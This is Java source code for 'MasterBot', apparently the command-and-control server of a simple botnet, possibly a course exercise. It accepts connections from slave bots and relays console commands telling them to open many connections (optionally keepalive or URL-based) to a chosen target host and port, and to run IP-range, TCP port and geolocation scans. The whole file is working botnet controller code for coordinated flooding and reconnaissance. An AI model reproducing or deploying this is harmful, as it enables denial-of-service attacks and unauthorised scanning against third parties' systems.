import java.io.*;
import java.net.*;
import java.util.*;
import java.text.*;

public class MasterBot{


	public static void main(String args[]) throws IOException{

		if (!args[0].equals("-p")) 
		{
			System.out.println("Input Format: MasterBot -p portnumber");
			System.exit(-1);
		}
		else
			if(args.length != 2)
			{
				System.out.println("Input Format: MasterBot -p portnumber");
				System.exit(-1);
			}

		{ 
			ServerSocket serverSocket = new ServerSocket(Integer.parseInt(args[1]));
			//System.out.println("Listening");
			System.out.print(">");

			CommandThread commandThread = new CommandThread();
			commandThread.start();

			while(true){ 
				// Slave connect to master
				Socket socket = serverSocket.accept();
				ServerThread serverThread = new ServerThread(socket);
				serverThread.start();
			}
		}
	}


}

// Store Slave List in a LinkedList
class slaveList{
	public static List<Socket> sList = Collections.synchronizedList(new LinkedList<>());
	public static List<String> registerDate = Collections.synchronizedList(new LinkedList<>());
	public int count = 0;

	slaveList() {}
}

// Add new salve to the slave list
class ServerThread extends Thread{
	Socket socket;
	Date date = new Date();
	DateFormat d = new SimpleDateFormat("yyyy-MM-dd");
	ServerThread(Socket socket){
		this.socket = socket;
	}
	public void run(){
		synchronized(slaveList.sList){
			slaveList.sList.add(socket);
		}
		synchronized(slaveList.registerDate){
			slaveList.registerDate.add(d.format(date).toString());
		}				
	}
}

// Thread that implements command line

class CommandThread extends Thread{

	private Socket socket;
	private boolean flag = true;
	private String tIP;   // Target IP
	private int tPort;    // Target PORT
	private int connections;

	public void run(){
		while(flag){
			try{

				BufferedReader commandInput = new BufferedReader(new InputStreamReader(System.in));
				String commandLine = commandInput.readLine();
				String[] cmd;
				cmd = commandLine.split(" ");
				switch (cmd[0]) {
				case "list":
					cmdList();
					break;
				case "connect":
					connect(cmd);
					break;
				case "disconnect":
					disconnect(cmd);
					break;
				case "ipscan":
					Thread ipscan = new IpScanThread(commandLine);
					ipscan.start();
					break;
				case "tcpportscan":
					Thread tcpscan = new TcpPortScanThread(commandLine);
					tcpscan.start();
					break;
				case "geoipscan":
					Thread geoipscan = new GeoIpScanThread(commandLine);
					geoipscan.start();
					break;
				case "Exit":
					System.exit(-1);
					break;
				default:
					System.out.println("Invalid Command");
					System.out.print(">");
					break;

				}
			}
			catch (IOException e){
				e.printStackTrace();
			}
		}

	}

	// List out the Slaves
	private void cmdList(){
		Socket slave;
		int i=0;
		if(slaveList.sList.size() == 0){
			//System.out.println("Checking if slave is connected");
		}
		else{

			while(i < slaveList.sList.size()){
				slave = slaveList.sList.get(i);
				System.out.println(slave.getInetAddress().getHostName() + " " 
						+ slave.getInetAddress().getHostAddress() + " " + slave.getPort() 
						+ " " + slaveList.registerDate.get(i));
				System.out.flush();
				i++;
			}
		}
		System.out.print(">");
	}

	// Connect a number of connections to the target host.
	private void connect(String[] cmd){
		int check = 0;
		int i=0;
		if(cmd.length != 4 && cmd.length != 5 && cmd.length != 6){
			System.out.println("Usage :Invalid command!\n");
		}
		else{
			tIP = cmd[2];
			tPort = Integer.parseInt(cmd[3]);

			if(cmd.length == 4){
				connections = 1;
			}
			else if(cmd.length == 5 && cmd[4].equals("keepalive")){
				connections = 1;
			}
			else if(cmd.length == 5 && cmd[4].startsWith("url=")){
				connections = 1;
			}
			else{
				connections = Integer.parseInt(cmd[4]);
			}

			while(i < slaveList.sList.size()){

				Socket eachSocket = slaveList.sList.get(i);

				if(cmd[1].equals("all") || 
						eachSocket.getInetAddress().getHostAddress().equals(cmd[1])||
						eachSocket.getInetAddress().getHostName().equals(cmd[1])){
					check = 1;
					try{
						OutputStream os = eachSocket.getOutputStream();
						PrintWriter pw = new PrintWriter(os, true);
						String outMessage = cmd[0] + " " + tIP + " " + tPort + " " + Integer.toString(connections);
						if( ( cmd.length == 6 && cmd[5].equals("keepalive") ) 
								|| (cmd.length == 5 && cmd[4].equals("keepalive")) ){
							outMessage += " keepalive";
						}
						else if( cmd.length == 5 && cmd[4].startsWith("url=")){
							outMessage += " " + cmd[4];
						}
						else if(cmd.length == 6 && cmd[5].startsWith("url=")){
							outMessage += " " + cmd[5]; 
						}
						pw.println(outMessage);
					}catch (IOException e){
						System.err.println("Failed to Excute");
						System.exit(-1);
					} 
				}  
				i++;
			}
			if(check == 0){
				System.out.println("Can not find the SlaveBot at Portal " + cmd[1]);
			}						
		}
		System.out.print(">");

	}

	// Disconnect a number of connections to a given host
	private void disconnect(String[] cmd){
		//System.out.println("disconnect");
		int i=0;
		boolean isFound = false;
		String distPort = "all";
		if(cmd.length != 3 && cmd.length != 4){
			System.out.println("Usage: Invalid command!");
		}
		else{

			tIP = cmd[2];
			if(cmd.length == 4){
				tPort = Integer.parseInt(cmd[3]);
			}

			while(i < slaveList.sList.size()){

				Socket everySocket = slaveList.sList.get(i);
				if(cmd[1].equals("all") || 
						everySocket.getInetAddress().getHostAddress().equals(cmd[1])||
						everySocket.getInetAddress().getHostName().equals(cmd[1])){

					isFound = true;
					try{
						OutputStream os = everySocket.getOutputStream();
						PrintWriter pw = new PrintWriter(os, true);
						String outMessage = "";
						if(cmd.length == 3){
							outMessage = cmd[0] + " " + tIP + " " + distPort;
						}
						else{
							outMessage = cmd[0] + " " + tIP + " " + Integer.toString(tPort); 
						}
						pw.println(outMessage);
					}
					catch (IOException e)
					{
						e.printStackTrace();
						System.exit(-1);
					}

				}
				i++;
			}
			if(isFound == false){
				System.out.println("Slave not found at " + cmd[1]);

			}

		}
		System.out.print(">");

	}


}
// IP SCAN
class IpScanThread extends Thread{
	String input;
	IpScanThread(String commandLine){
		input = commandLine;
	}

	public void run(){
		String[] cmd;
		int i=0;
		cmd = input.split(" ");
		boolean isFound = false;
		if(cmd.length != 3 || cmd[2].contains("-") == false){
			System.out.println("Usage: ipscan all 1.1.1.1-1.1.1.10");
			System.out.print(">");
		}
		else{

			int range = cmd[2].indexOf("-");

			while(i < slaveList.sList.size()){
				Socket oneSocket = slaveList.sList.get(i);

				if(cmd[1].equals("all") || oneSocket.getInetAddress().getHostAddress().equals(cmd[1])||
						oneSocket.getInetAddress().getHostName().equals(cmd[1])){
					isFound = true;
					try{	
						OutputStream os = oneSocket.getOutputStream();
						PrintWriter pw = new PrintWriter(os, true);
						String message = "";
						message = cmd[0] + " " + cmd[2].substring(0, range) + " " + cmd[2].substring(range + 1);
						pw.println(message);
						BufferedReader fromSlave = new BufferedReader(new InputStreamReader(oneSocket.getInputStream()));
						System.out.print(">");
						String iplist=fromSlave.readLine();
						if(iplist.isEmpty())
						{
							System.out.println("IP Address List Empty");
							System.out.print(">");
						}
						else
						{
							System.out.println("Responded IP Address List: "+iplist);
							System.out.print(">");
						}

					}catch (IOException e){
						//System.out.println("IP Address List Empty");
					} 

				}	
				i++;
			}
			if(isFound == false){
				System.out.println("Can not find the SlaveBot");
			}
		}
		//System.out.print(">");
	}
}

// TCP PORT SCAN
class TcpPortScanThread extends Thread{
	String input;
	TcpPortScanThread(String commandLine){
		input = commandLine;
	}

	public void run(){
		String[] cmd = input.split(" ");
		int i=0;
		int check = 0;
		if(cmd.length != 4 || !cmd[3].contains("-")){
			System.out.println("Usage: tcpportscan all google.com 70-100");
			System.out.print(">");
		}
		else{
			int index = cmd[3].indexOf("-");
			String low = cmd[3].substring(0, index);
			String high = cmd[3].substring(index + 1);

			while(i < slaveList.sList.size()){
				Socket masterSocket = slaveList.sList.get(i);

				if(cmd[1].equals("all") || masterSocket.getInetAddress().getHostAddress().equals(cmd[1])||
						masterSocket.getInetAddress().getHostName().equals(cmd[1])){
					check = 1;
					try{
						OutputStream os = masterSocket.getOutputStream();
						PrintWriter pw = new PrintWriter(os, true);
						String outMessage = "";
						outMessage = cmd[0] + " " + cmd[2] + " " + low + " " + high;
						pw.println(outMessage);
						BufferedReader listFromSlave = new BufferedReader(new InputStreamReader(masterSocket.getInputStream()));
						System.out.print(">");
						String list=listFromSlave.readLine();
						if(list.isEmpty())
						{
							System.out.println("Port List Empty");
							System.out.print(">");
						}
						else
						{
							System.out.println("Active Port Numbers: " + list);
							System.out.print(">");

						}

					}catch (IOException e){
						//System.out.println("Port List Empty");
					}

				}
				i++;
			}
			if(check == 0){
				System.out.println("Slavebot not found");
			}
		}
		//System.out.print(">");
	}
}




//geolocation ip scan 
class GeoIpScanThread extends Thread{
	String input;
	GeoIpScanThread(String commandLine){
		input = commandLine;
	}

	public void run(){
		String[] commandString = input.split(" ");
		int check=0;
		if(commandString.length != 3 || !input.contains("-")){
			System.out.println("Usage: geoipscan all 1.1.1.1-1.1.1.10");
			System.out.print(">");
		}
		else{
			System.out.print(">");
			int index = commandString[2].indexOf("-");
			String start = commandString[2].substring(0, index);
			String end = commandString[2].substring(index + 1);
			for(int i = 0; i < slaveList.sList.size(); i++){
				Socket clientSocket = slaveList.sList.get(i);

				if(commandString[1].equals("all") || clientSocket.getInetAddress().getHostAddress().equals(commandString[1])||
						clientSocket.getInetAddress().getHostName().equals(commandString[1])){
					check =1;
					try{
						OutputStream os = clientSocket.getOutputStream();
						PrintWriter pw = new PrintWriter(os, true);
						String outMessage = "";
						outMessage = commandString[0] + " " + start + " " + end;
						pw.println(outMessage);

						BufferedReader listFromSlave = new BufferedReader(new InputStreamReader(clientSocket.getInputStream()));
						//System.out.print(listFromSlave.readLine());
						String location = listFromSlave.readLine();
						//System.out.println(location);
						if(location.isEmpty())
						{
							System.out.println("Geo IP Scan - List Empty" );
							//System.out.print(">");
						}
						else
							if(location.contains(";")){
								String locationList = location.replace(";", "\n");
								System.out.println(locationList);
							}

					}catch (IOException e){
						e.printStackTrace();
					}
				}
			}
			if(check==0){
				System.out.println("Slavebot not found");
			}
		}
		System.out.print(">");
	}
}


